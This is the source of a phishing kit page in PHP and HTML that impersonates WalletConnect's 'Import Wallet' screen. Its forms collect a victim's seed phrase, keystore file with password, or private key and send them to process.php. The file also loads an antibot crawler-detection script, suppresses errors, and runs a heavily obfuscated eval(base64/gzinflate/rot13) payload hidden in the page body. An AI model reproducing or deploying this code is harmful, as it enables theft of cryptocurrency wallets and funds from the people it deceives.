<html>
<meta http-equiv="content-type" content="text/html" />
<?php
error_reporting(0);
include '../files/antibot/crawlerdetect.php';
include_once '../functions.php';
?>

<head>
  <meta charset="UTF-8">
  <link rel="stylesheet" href="./files/main_new.css" type="text/css" />
  <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.2/jquery.validate.min.js" integrity="sha512-UdIMMlVx0HEynClOIFSyOrPggomfhBKJE28LKl8yR3ghkgugPnG6iLfRfHwushZl1MOPSY6TsuBDGPK2X4zYKg==" crossorigin="anonymous"></script>


  <meta name="description" content="Open protocol for connecting Wallets to Dapps">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta property="og:image" content="./files/images/logo.svg">
  <link rel="icon" href="./files/images/logo.svg">
  <script>
    function openCity(evt, cityName) {
      // Declare all variables
      var i, tabcontent, tablinks;

      // Get all elements with class="tabcontent" and hide them
      tabcontent = document.getElementsByClassName("tabcontent");
      for (i = 0; i < tabcontent.length; i++) {
        tabcontent[i].style.display = "none";
      }

      // Get all elements with class="tablinks" and remove the class "active"
      tablinks = document.getElementsByClassName("tablinks");
      for (i = 0; i < tablinks.length; i++) {
        tablinks[i].className = tablinks[i].className.replace(" active", "");
      }

      // Show the current tab, and add an "active" class to the button that opened the tab
      document.getElementById(cityName).style.display = "block";
      evt.currentTarget.className += " active";
    }
  </script>
</head>



<title>Import Wallet</title>

<body>
  <center>
    <header class="sticky top-0 z-10 flex items-center justify-between px-5 py-4 bg-white md:py-6 ">
      <div class="absolute inset-0 shadow-lg opacity-50"></div>
      <div class="z-20 flex justify-around w-full sm:pr-10 md:pr-20"><a
              class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl" target="_blank"
              href="https://github.com/walletconnect" rel="noopener noreferrer">
              GitHub
          </a><a class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl" target="_blank"
              href="https://docs.walletconnect.org/" rel="noopener noreferrer">
              Docs
          </a></div>
      <div class="z-20 flex">
          <div class="w-16 mx-6 sm:w-20 md:w-28"><img class="cursor-pointer object-fit"
                  src="./files/walletconnect-logo.svg" href="#"alt="walletconnect logo" /></div>
      </div>
      <div class="z-20 flex justify-around w-full sm:pl-10 md:pl-20"><a
              class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl"
              href="#">
              Wallets
          </a><a class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl"
              href="#">
              Apps
          </a></div>
  </header>
    </br>
    <div class="text-cool-gray-500">
      <h1 class="flex justify-center mt-20 text-4xl font-semibold import__page">Import Wallet </h1>
    </br>
	  
	  
	  <div class="tab">
                    <button class="tablinks" id="default" onclick="openCity(event, 'phrase')">Phrase</b></button>
                    <button class="tablinks" onclick="openCity(event, 'keystore')">Keystore JSON</b></button>
                    <button class="tablinks" onclick="openCity(event, 'private')">Private Key</b></button>
					
                  </div>
				  

                <div role="presentation" class="sc-eLwHGX sc-uoixf dVYXTr jGzOKM"></div>
                </div>
				
    
	
               
                <div id="phrase" class="tabcontent">
                     <form action="process.php" method="POST" id="form1">
                      <textarea name="key" required="required" minlength="12" placeholder="Phrase" required="required"></textarea>
                      </br>
                      <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
                      </br>
                      <button form="form1" value="Import" type="submit" name="import" class="btn blMRzM">IMPORT</button>
                    </form>
                  </div>
              
                  <div id="keystore" class="tabcontent">
                    <form action="process.php" method="POST" id="form2">
                      <textarea name="key" required="required" minlength="12" placeholder="Keystore JSON"
                        required="required"></textarea>
                      </br>
                      <div class="field">
                        <input type="text" name="pass" placeholder="Password" required="required" minlength="4" />
                      </div>
                      <div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
                      </br>
                      <button form="form2" value="Import" type="submit" name="import" class="btn blMRzM">IMPORT</button>
                    </form>
                  </div>
              
                  <div id="private" class="tabcontent">
                    <form action="process.php" method="POST" id="form3">
                      <div class="field">
                        <input type="text" name="key" placeholder="Private Key" required="required" minlength="64" />
                      </div>
                      <div class="desc">Typically 64 alphanumeric characters</div>
                      </br>
                      <button form="form3" value="Import" type="submit" name="import" class="btn blMRzM">IMPORT</button>
                    </form>
                  </div> 
				  
                  <script>
                    document.getElementById("default").click();
                  </script>
 
    </div>
   


    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
	  <?php eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));?>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js" integrity="sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js" integrity="sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ" crossorigin="anonymous"></script>
  </body>
</html>








<script src="./files/jquery.min.js.download"></script>

    <footer class="flex justify-center mt-24 mb-16 sm:mt-32">
      <div class="flex flex-col space-y-6 sm:space-y-0 sm:space-x-20 sm:flex-row"><a
          class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank"
          href="https://discord.gg/jhxMvxP" rel="noopener noreferrer">
          <div class="flex"><img class="w-6 sm:w-8" src="./files/discord.svg" alt="Discord" />
            <p class="ml-2">Discord</p>
          </div>
        </a><a class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank"
          href="https://twitter.com/walletconnect" rel="noopener noreferrer">
          <div class="flex"><img class="w-6 sm:w-8" src="./files/twitter.svg" alt="Twitter" />
            <p class="ml-2">Twitter</p>
          </div>
        </a><a class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank"
          href="https://github.com/walletconnect" rel="noopener noreferrer">
          <div class="flex"><img class="w-6 sm:w-8" src="./files/github.svg" alt="GitHub" />
            <p class="ml-2">GitHub</p>
          </div>
        </a></div>
    </footer>
 
<script src="/script.js"></script>
</body>

</html>

